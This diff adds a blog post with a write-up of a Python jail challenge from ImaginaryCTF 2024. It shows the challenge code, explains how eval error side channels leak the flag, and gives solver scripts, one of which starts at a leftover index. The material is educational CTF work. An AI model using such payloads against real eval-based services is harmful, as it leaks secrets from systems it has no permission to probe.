@@ -1,0 +1,134 @@
+---
+title: "(ictf) ok nice writeup"
+description: "I found this challenge particularly fun, So a special writeup is justified."
+pubDate: "Jul 22 2024"
+---
+
+We recently competed in [Imaginary ctf](https://2024.imaginaryctf.org/) while all the challenges were
+very fun I found this one particularly interesting, hence a special writeup is justified. This is also
+my first one so please bear 🐻 with me and hopefully someday I'll write one for an entire CTF.
+
+### Challenge 🎮
+
+This was a misc category challenge and the description was as follows:
+
+![ok-nice (267pts) - 64 solves by NoobMaster Description Ok nice Attachments https://cybersharing.net/s/68520aa758a9087c nc ok-nice.chal.imaginaryctf.org 1337](/oknice.png)
+
+```py
+#!/usr/bin/env python3
+flag = '[REDACTED]'
+
+print("Welcome to the jail! It is so secure I even have a flag variable!")
+blacklist=['0','1','2','3','4','5','6','7','8','9','_','.','=','>','<','{','}','class','global','var','local','import','exec','eval','t','set','blacklist']
+while True:
+	inp = input("Enter input: ")
+	for i in blacklist:
+		if i in inp:
+			print("ok nice")
+			exit(0)
+	for i in inp:
+		if (ord(i) > 125) or (ord(i) < 40) or (len(set(inp))>17):
+			print("ok nice")
+			exit(0)
+    try:
+        eval(inp,{'__builtins__':None,'ord':ord,'flag':flag})
+        print("ok nice")
+    except:
+        print("error")
+```
+
+As we can see the challenge is a python jail where we have to execute the `flag` variable. There are some constraints
+no `__builtins__` and yet `_` is blacklisted. I banged my head over this for a while, and then the realisation dawned
+upon me. We cannot get the flag directly but we can perform a `side channel attack` ie other relevant info is leaked,
+which can lead us upto the flag.
+
+My first instinct was to use the `ord` function instead of numbers since numerical digits aren't allowed anywhere, but alas!
+ `' and "` aren't allowed either.  
+ What other way to get integers?  
+  
+🤔 Aha remember the thing people hate about python? `True == 1`and `False == 0` 😈.   
+
+So we can use `True` and `False` to get the numbers. With this we can now go character to character.
+Since we can do `flag[False]` to get get the 0th character, similarly `flag[True+True]` for 2nd and so on.
+With this in mind, my main aim now was to throw an error when the character is right and the simples way to do that is 
+the age old `1/0` trick. Hence i came up with the payload.
+
+```py
+True/(ord(flag[False])-(True+True))
+```
+
+So here the code will throw an err if the char at flag[0] has ascii value 2! boom! we done? NOPE! not yet 😅  
+The other condition requires you to have less than 17 unique characters in your payload. So poof this won't work
+any other way to throw an error? Ofc the classic `index out of bounds` error. So we can use the following payload.
+
+```py
+[flag][ord(flag[True-True])-(True+True)]
+```
+notice the sneaky True-True instead of False to reduce unique characters 👀  
+oof and that's it we have arrived on the final payload now you can just write a simple script!
+
+> or get a lil ai to write it for you 😏
+
+```py
+def find_flag_length():
+    length = 2
+    while True:
+        try:
+            sock = connect_to_server()
+            payload = f"flag[{'+'.join(['True']*length)}]"
+            response = send_receive(sock, payload)
+            print(response)
+            if "error" in response.lower():
+                sock.close()
+                return length
+            length += 1
+        except ConnectionError:
+            print("con err")
+        except:
+            print("err")
+```
+A basic payload of just `flag[True+True .....]` will give you the length of the flag, run it till you get an error.
+This gives us the length which was 24 characters, neat!
+
+Now to get the flag we can use the following script.
+
+```py
+def decode_flag(length):
+    flag = ""
+    for i in range(17,length):
+        for ascii_val in range(127,32,-1):  # Printable ASCII range
+            try:
+                sock = connect_to_server()
+                payload = f"[flag][ord(flag[{'+'.join(['True']*i)}])-({'+'.join(['True']*ascii_val)})]"
+                response = send_receive(sock, payload)
+                print(response,'tried',ascii_val)
+
+                if "error" not in response.lower():
+                    flag += chr(ascii_val-1)
+                    print(f"Decoded character {i+1}/{length}: {chr(ascii_val-1)}")
+                    break
+            except ConnectionError:
+                print(f"con err {i+1}.")
+                ascii_val -= 1 
+            except:
+                print(f"err {i+1}.")
+        else:
+            print(f"Failed to decode character {i+1}")
+            flag += "?"
+    return flag
+```
+
+
+And voila once it's done running which takes about 5 mins!  
+We have the flag!
+```
+ictf{0k_n1c3_7f4d3e5a6b}
+```
+
+> The whole solving script is available [here](/breakjail.py)!
+
+I hope you enjoyed this writeup as much as I enjoyed solving it!  
+Huge thanks to NoobMaster on the ICTF discord for this very cool challenge!  
+
+~ with 💖 by Om.
+
